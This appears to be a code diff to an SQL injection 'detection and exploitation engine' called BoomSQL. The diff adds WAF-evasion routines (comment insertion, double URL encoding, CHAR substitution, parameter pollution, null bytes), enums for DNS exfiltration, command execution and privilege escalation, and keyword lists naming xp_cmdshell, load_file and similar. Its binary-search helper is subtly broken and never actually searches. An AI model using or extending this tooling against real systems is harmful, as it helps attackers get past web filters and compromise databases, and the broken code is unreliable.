@@ -4,7 +4,6 @@ Advanced SQL injection detection and exploitation engine
 """
 
 import asyncio
-import aiohttp
 import re
 import time
 import xml.etree.ElementTree as ET
@@ -20,6 +19,7 @@ from dataclasses import dataclass
 from enum import Enum
 
 from .logger import LoggerMixin
+from .fallbacks import aiohttp, ClientSession, AIOHTTP_AVAILABLE
 
 class InjectionType(Enum):
     """SQL injection types"""
@@ -36,6 +36,16 @@ class InjectionType(Enum):
     MULTIPLE_BLIND = "multiple_blind"
     RESPONSE_TIME = "response_time"
     JSON_INJECTION = "json_injection"
+    # Advanced techniques
+    DNS_EXFILTRATION = "dns_exfiltration"
+    INLINE_QUERIES = "inline_queries"
+    SUBQUERY_INJECTION = "subquery_injection"
+    WEBSOCKET_INJECTION = "websocket_injection"
+    FILE_INCLUSION = "file_inclusion"
+    COMMAND_EXECUTION = "command_execution"
+    PRIVILEGE_ESCALATION = "privilege_escalation"
+    BINARY_SEARCH_BLIND = "binary_search_blind"
+    STATISTICAL_BLIND = "statistical_blind"
 
 class InjectionVector(Enum):
     """Injection vectors"""
@@ -46,6 +56,14 @@ class InjectionVector(Enum):
     URL_PATH = "url_path"
     JSON_PARAMETER = "json_parameter"
     XML_PARAMETER = "xml_parameter"
+    # Advanced vectors
+    USER_AGENT = "user_agent"
+    REFERER = "referer"
+    WEBSOCKET_FRAME = "websocket_frame"
+    SOAP_PARAMETER = "soap_parameter"
+    CUSTOM_HEADER = "custom_header"
+    MULTIPART_FORM = "multipart_form"
+    FILE_UPLOAD = "file_upload"
 
 class DatabaseType(Enum):
     """Supported database types"""
@@ -165,23 +183,27 @@ class SqlInjectionEngine(LoggerMixin):
         
     def init_session(self):
         """Initialize aiohttp session"""
-        timeout = aiohttp.ClientTimeout(total=self.config.get("RequestTimeout", 30))
-        connector = aiohttp.TCPConnector(
-            limit=self.config.get("MaxThreads", 5),
-            ssl=False if not self.config.get("EnableSslCertificateValidation", False) else None
-        )
-        
-        self.session = aiohttp.ClientSession(
-            timeout=timeout,
-            connector=connector,
-            headers={
-                'User-Agent': self.config.get("UserAgent", "BoomSQL/2.0"),
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'keep-alive'
-            }
-        )
+        if AIOHTTP_AVAILABLE:
+            timeout = aiohttp.ClientTimeout(total=self.config.get("RequestTimeout", 30))
+            connector = aiohttp.TCPConnector(
+                limit=self.config.get("MaxThreads", 5),
+                ssl=False if not self.config.get("EnableSslCertificateValidation", False) else None
+            )
+            
+            self.session = aiohttp.ClientSession(
+                timeout=timeout,
+                connector=connector,
+                headers={
+                    'User-Agent': self.config.get("UserAgent", "BoomSQL/2.0"),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Connection': 'keep-alive'
+                }
+            )
+        else:
+            # Use fallback session
+            self.session = ClientSession()
         
     async def close(self):
         """Close the session"""
@@ -805,3 +827,321 @@ class SqlInjectionEngine(LoggerMixin):
                 transform_function="whitespace_manipulation"
             )
         ]
+    
+    def apply_advanced_waf_bypasses(self, payload: str) -> List[str]:
+        """Apply advanced WAF bypass techniques to payload"""
+        bypassed_payloads = []
+        
+        # 1. Encoding bypasses
+        bypassed_payloads.extend(self._apply_encoding_bypasses(payload))
+        
+        # 2. Case manipulation
+        bypassed_payloads.extend(self._apply_case_manipulation(payload))
+        
+        # 3. Comment insertion
+        bypassed_payloads.extend(self._apply_comment_insertion(payload))
+        
+        # 4. String concatenation
+        bypassed_payloads.extend(self._apply_string_concatenation(payload))
+        
+        # 5. Function calls
+        bypassed_payloads.extend(self._apply_function_calls(payload))
+        
+        # 6. Logical operators
+        bypassed_payloads.extend(self._apply_logical_operators(payload))
+        
+        # 7. Mathematical operations
+        bypassed_payloads.extend(self._apply_mathematical_operations(payload))
+        
+        # 8. Double encoding
+        bypassed_payloads.extend(self._apply_double_encoding(payload))
+        
+        # 9. HTTP Parameter Pollution
+        bypassed_payloads.extend(self._apply_hpp_bypass(payload))
+        
+        # 10. Null byte injection
+        bypassed_payloads.extend(self._apply_null_byte_injection(payload))
+        
+        return bypassed_payloads
+    
+    def _apply_encoding_bypasses(self, payload: str) -> List[str]:
+        """Apply various encoding bypass techniques"""
+        bypasses = []
+        
+        # URL encoding
+        bypasses.append(urllib.parse.quote(payload))
+        
+        # HTML encoding
+        bypasses.append(html.escape(payload))
+        
+        # Unicode encoding
+        bypasses.append(''.join(f'%u{ord(c):04X}' for c in payload))
+        
+        # Base64 encoding (for specific contexts)
+        bypasses.append(base64.b64encode(payload.encode()).decode())
+        
+        return bypasses
+    
+    def _apply_case_manipulation(self, payload: str) -> List[str]:
+        """Apply case manipulation techniques"""
+        bypasses = []
+        
+        # Mixed case
+        bypasses.append(''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
+        
+        # All uppercase
+        bypasses.append(payload.upper())
+        
+        # All lowercase
+        bypasses.append(payload.lower())
+        
+        # Random case
+        import random
+        bypasses.append(''.join(random.choice([c.upper(), c.lower()]) for c in payload))
+        
+        return bypasses
+    
+    def _apply_comment_insertion(self, payload: str) -> List[str]:
+        """Apply comment insertion techniques"""
+        bypasses = []
+        
+        # MySQL comments
+        bypasses.append(payload.replace(' ', '/**/'))
+        bypasses.append(payload.replace(' ', '/*!*/'))
+        
+        # SQL Server comments
+        bypasses.append(payload.replace(' ', '-- \n'))
+        
+        # Nested comments
+        bypasses.append(payload.replace(' ', '/*/* */'))
+        
+        return bypasses
+    
+    def _apply_string_concatenation(self, payload: str) -> List[str]:
+        """Apply string concatenation techniques"""
+        bypasses = []
+        
+        # MySQL CONCAT
+        if 'SELECT' in payload.upper():
+            bypasses.append(payload.replace('SELECT', 'SELECT CONCAT('))
+        
+        # SQL Server + operator
+        bypasses.append(payload.replace("'", "'+'"))
+        
+        # Oracle || operator
+        bypasses.append(payload.replace("'", "'||'"))
+        
+        return bypasses
+    
+    def _apply_function_calls(self, payload: str) -> List[str]:
+        """Apply function call techniques"""
+        bypasses = []
+        
+        # CHAR function
+        if "'" in payload:
+            bypasses.append(payload.replace("'", "CHAR(39)"))
+        
+        # ASCII function
+        bypasses.append(payload.replace('A', 'CHAR(65)'))
+        
+        # HEX function
+        bypasses.append(payload.replace('A', '0x41'))
+        
+        return bypasses
+    
+    def _apply_logical_operators(self, payload: str) -> List[str]:
+        """Apply logical operator variations"""
+        bypasses = []
+        
+        # AND variations
+        bypasses.append(payload.replace('AND', '&&'))
+        bypasses.append(payload.replace('AND', '%26%26'))
+        
+        # OR variations
+        bypasses.append(payload.replace('OR', '||'))
+        bypasses.append(payload.replace('OR', '%7C%7C'))
+        
+        # NOT variations
+        bypasses.append(payload.replace('NOT', '!'))
+        
+        return bypasses
+    
+    def _apply_mathematical_operations(self, payload: str) -> List[str]:
+        """Apply mathematical operation techniques"""
+        bypasses = []
+        
+        # Addition
+        bypasses.append(payload.replace('1', '0+1'))
+        
+        # Subtraction
+        bypasses.append(payload.replace('1', '2-1'))
+        
+        # Multiplication
+        bypasses.append(payload.replace('1', '1*1'))
+        
+        # Division
+        bypasses.append(payload.replace('1', '2/2'))
+        
+        # Modulo
+        bypasses.append(payload.replace('1', '3%2'))
+        
+        return bypasses
+    
+    def _apply_double_encoding(self, payload: str) -> List[str]:
+        """Apply double encoding techniques"""
+        bypasses = []
+        
+        # Double URL encoding
+        single_encoded = urllib.parse.quote(payload)
+        bypasses.append(urllib.parse.quote(single_encoded))
+        
+        # %2527 for single quote
+        bypasses.append(payload.replace("'", "%2527"))
+        
+        # %252F for forward slash
+        bypasses.append(payload.replace("/", "%252F"))
+        
+        return bypasses
+    
+    def _apply_hpp_bypass(self, payload: str) -> List[str]:
+        """Apply HTTP Parameter Pollution bypass"""
+        bypasses = []
+        
+        # Duplicate parameter with different values
+        if '=' in payload:
+            parts = payload.split('=', 1)
+            bypasses.append(f"{parts[0]}=1&{parts[0]}={parts[1]}")
+        
+        return bypasses
+    
+    def _apply_null_byte_injection(self, payload: str) -> List[str]:
+        """Apply null byte injection techniques"""
+        bypasses = []
+        
+        # %00 null byte
+        bypasses.append(payload + "%00")
+        
+        # \x00 null byte
+        bypasses.append(payload + "\\x00")
+        
+        # Null byte in middle
+        bypasses.append(payload.replace(' ', '%00'))
+        
+        return bypasses
+    
+    def detect_dns_exfiltration(self, payload: str, response: str) -> bool:
+        """Detect DNS exfiltration capabilities"""
+        # Check for DNS-based data exfiltration indicators
+        dns_indicators = [
+            'nslookup', 'dig', 'host', 'ping',
+            'xp_cmdshell', 'xp_dirtree', 'xp_subdirs',
+            'load_file', 'into outfile'
+        ]
+        
+        for indicator in dns_indicators:
+            if indicator.lower() in payload.lower():
+                return True
+        
+        return False
+    
+    def detect_file_access(self, payload: str, response: str) -> bool:
+        """Detect file system access capabilities"""
+        file_indicators = [
+            'load_file', 'into outfile', 'into dumpfile',
+            'xp_cmdshell', 'sp_oacreate', 'sp_oamethod',
+            'readfile', 'writefile', 'sys_exec',
+            'pg_read_file', 'pg_stat_file'
+        ]
+        
+        for indicator in file_indicators:
+            if indicator.lower() in payload.lower():
+                return True
+        
+        return False
+    
+    def detect_command_execution(self, payload: str, response: str) -> bool:
+        """Detect command execution capabilities"""
+        cmd_indicators = [
+            'xp_cmdshell', 'sys_exec', 'system',
+            'exec', 'shell_exec', 'passthru',
+            'pg_sleep', 'waitfor delay',
+            'benchmark', 'sleep'
+        ]
+        
+        for indicator in cmd_indicators:
+            if indicator.lower() in payload.lower():
+                return True
+        
+        return False
+    
+    def detect_privilege_escalation(self, payload: str, response: str) -> bool:
+        """Detect privilege escalation attempts"""
+        priv_indicators = [
+            'grant', 'revoke', 'alter user', 'create user',
+            'drop user', 'admin', 'dba', 'sysadmin',
+            'db_owner', 'root', 'superuser'
+        ]
+        
+        for indicator in priv_indicators:
+            if indicator.lower() in payload.lower():
+                return True
+        
+        return False
+    
+    def apply_binary_search_optimization(self, payload: str, target_length: int) -> List[str]:
+        """Apply binary search optimization for blind SQL injection"""
+        optimized_payloads = []
+        
+        # Binary search for length
+        low, high = 1, target_length
+        while low <= high:
+            mid = (low + high) // 2
+            length_payload = payload.replace('TARGET_LENGTH', str(mid))
+            optimized_payloads.append(length_payload)
+            # This would be used in conjunction with response analysis
+            low = mid + 1
+        
+        return optimized_payloads
+    
+    def apply_statistical_analysis(self, responses: List[Dict]) -> Dict:
+        """Apply statistical analysis to blind SQL injection responses"""
+        if not responses:
+            return {}
+        
+        # Calculate response time statistics
+        response_times = [r.get('response_time', 0) for r in responses]
+        
+        if response_times:
+            avg_time = sum(response_times) / len(response_times)
+            max_time = max(response_times)
+            min_time = min(response_times)
+            
+            # Simple statistical analysis
+            variance = sum((t - avg_time) ** 2 for t in response_times) / len(response_times)
+            std_dev = variance ** 0.5
+            
+            return {
+                'avg_response_time': avg_time,
+                'max_response_time': max_time,
+                'min_response_time': min_time,
+                'std_deviation': std_dev,
+                'variance': variance,
+                'confidence_level': self._calculate_confidence(std_dev, avg_time)
+            }
+        
+        return {}
+    
+    def _calculate_confidence(self, std_dev: float, avg_time: float) -> float:
+        """Calculate confidence level for statistical analysis"""
+        if avg_time == 0:
+            return 0.0
+        
+        coefficient_of_variation = std_dev / avg_time
+        
+        # Higher coefficient of variation = lower confidence
+        if coefficient_of_variation < 0.1:
+            return 0.9  # High confidence
+        elif coefficient_of_variation < 0.3:
+            return 0.7  # Medium confidence
+        else:
+            return 0.4  # Low confidence
